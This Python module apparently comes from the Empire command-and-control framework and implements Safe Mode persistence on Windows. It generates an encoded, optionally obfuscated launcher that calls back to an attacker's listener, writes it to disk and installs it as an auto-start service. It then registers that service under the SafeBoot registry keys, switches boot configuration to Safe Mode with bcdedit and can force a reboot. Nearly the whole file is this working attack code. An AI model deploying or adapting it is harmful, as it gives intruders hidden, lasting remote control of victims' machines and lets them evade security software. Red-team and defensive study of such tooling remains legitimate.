from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        language = params["Language"]
        service_name = params["ServiceName"]
        script_path = params["ScriptPath"]
        safe_boot_type = params["SafeBootType"]
        force_reboot = params["ForceReboot"]
        cleanup = params["Cleanup"]
        obf = params["Obfuscate"].lower() == "true"
        obf_cmd = params["ObfuscateCommand"]
        bypasses = params["Bypasses"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if cleanup.lower() == "true":
            script = "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
            script += script_path + "');\n"
            script += (
                "Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
            )
            script += "$result = bcdedit /deletevalue '{current}' safeboot 2>&1;\n"
            script += "if ($LASTEXITCODE -ne 0) {\n"
            script += '    Write-Output "[-] CRITICAL: bcdedit /deletevalue failed: $result";\n'
            script += "    Write-Output '[-] System will still boot into Safe Mode on next reboot. Manual cleanup required.';\n"
            script += "    return;\n"
            script += "};\n"
            script += 'Write-Output "[*] bcdedit cleanup: $result";\n'
            script += (
                "$minPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\"
                + service_name
                + "';\n"
            )
            script += (
                "$netPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\"
                + service_name
                + "';\n"
            )
            script += "if (Test-Path $minPath) { Remove-Item -Path $minPath -Recurse -Force; Write-Output '[+] Removed SafeBoot\\Minimal entry' };\n"
            script += "if (Test-Path $netPath) { Remove-Item -Path $netPath -Recurse -Force; Write-Output '[+] Removed SafeBoot\\Network entry' };\n"
            script += (
                "$svc = Get-Service -Name '"
                + service_name
                + "' -ErrorAction SilentlyContinue;\n"
            )
            script += (
                "if ($svc) { $delResult = sc.exe delete '"
                + service_name
                + "' 2>&1; if ($LASTEXITCODE -ne 0) { Write-Output \"[-] Failed to delete service: $delResult\" } else { Write-Output '[+] Removed service: "
                + service_name
                + "' } };\n"
            )
            script += "Write-Output '[+] Safe Mode persistence removed. System will boot normally.'"

            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if not listener_name:
            raise ModuleValidationException("Listener is required.")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        lang = language.lower()
        try:
            if lang == "powershell":
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=bypasses,
                )
            elif lang in ("csharp", "ironpython"):
                launcher = main_menu.stagergenv2.generate_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            elif lang == "go":
                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            else:
                raise ModuleValidationException(f"Language '{language}' not supported.")
        except ModuleValidationException:
            raise
        except Exception as e:
            raise ModuleValidationException(
                f"[!] Launcher generation failed for {language}: {e}"
            ) from e

        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        script = "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
        script += script_path + "');\n"
        script += "try {\n"
        script += "    [System.IO.File]::WriteAllText($scriptFile, '"
        script += launcher.replace("'", "''") + "');\n"
        script += "} catch {\n"
        script += '    Write-Output "[-] Failed to write launcher: $_"; return;\n'
        script += "};\n"
        script += 'Write-Output "[+] Wrote launcher to: $scriptFile";\n'
        # Create service via New-Service (handles Windows command-line escaping
        # correctly, unlike hand-quoting sc.exe binpath= with embedded quotes).
        script += "$binPath = 'cmd.exe /c \"' + $scriptFile + '\"';\n"
        script += "try {\n"
        script += (
            "    New-Service -Name '"
            + service_name
            + "' -BinaryPathName $binPath -StartupType Automatic -ErrorAction Stop | Out-Null;\n"
        )
        script += "} catch {\n"
        script += '    Write-Output "[-] Service creation failed: $_";\n'
        script += (
            "    Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
        )
        script += "    return;\n"
        script += "};\n"
        script += (
            "Write-Output '[*] Created service "
            + service_name
            + " with binpath: '$binPath;\n"
        )
        # Register for Safe Mode (with rollback helper)
        script += (
            "$minPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\"
            + service_name
            + "';\n"
        )
        script += (
            "$netPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\"
            + service_name
            + "';\n"
        )
        # Define rollback so any failure past service creation tears everything down
        script += "$rollback = {\n"
        script += "    Write-Output '[*] Rolling back partial install...';\n"
        script += "    if (Test-Path $minPath) { Remove-Item -Path $minPath -Recurse -Force -ErrorAction SilentlyContinue };\n"
        script += "    if (Test-Path $netPath) { Remove-Item -Path $netPath -Recurse -Force -ErrorAction SilentlyContinue };\n"
        script += "    $delResult = sc.exe delete '" + service_name + "' 2>&1;\n"
        script += '    if ($LASTEXITCODE -ne 0) { Write-Output "[-] Rollback: sc.exe delete failed: $delResult" };\n'
        script += (
            "    Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
        )
        script += "};\n"
        script += "try {\n"
        script += "    New-Item -Path $minPath -Force -ErrorAction Stop | Out-Null;\n"
        script += "    Set-ItemProperty -Path $minPath -Name '(Default)' -Value 'Service' -ErrorAction Stop;\n"
        script += (
            "    Write-Output '[+] Registered "
            + service_name
            + " in SafeBoot\\Minimal';\n"
        )
        script += "    New-Item -Path $netPath -Force -ErrorAction Stop | Out-Null;\n"
        script += "    Set-ItemProperty -Path $netPath -Name '(Default)' -Value 'Service' -ErrorAction Stop;\n"
        script += (
            "    Write-Output '[+] Registered "
            + service_name
            + " in SafeBoot\\Network';\n"
        )
        script += "} catch {\n"
        script += '    Write-Output "[-] SafeBoot registry write failed: $_";\n'
        script += "    & $rollback;\n"
        script += "    return;\n"
        script += "};\n"
        # Set Safe Mode boot
        if safe_boot_type.lower() == "network":
            script += "$bcdResult = bcdedit /set '{current}' safeboot network 2>&1;\n"
        else:
            script += "$bcdResult = bcdedit /set '{current}' safeboot minimal 2>&1;\n"
        script += "if ($LASTEXITCODE -ne 0) {\n"
        script += '    Write-Output "[-] bcdedit failed: $bcdResult";\n'
        script += "    & $rollback;\n"
        script += "    return;\n"
        script += "};\n"
        script += 'Write-Output "[*] bcdedit safeboot: $bcdResult";\n'
        script += "Write-Output '[+] Safe Mode persistence configured.';\n"
        script += "Write-Output '[*]   Service: " + service_name + "';\n"
        script += (
            "Write-Output '[*]   Boot type: Safe Mode with " + safe_boot_type + "';\n"
        )

        if force_reboot.lower() == "true":
            script += "Write-Output '[!] WARNING: System will reboot in 30 seconds.';\n"
            script += "shutdown /r /t 30"
        else:
            script += "Write-Output '[*] System will enter Safe Mode on next reboot.'"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
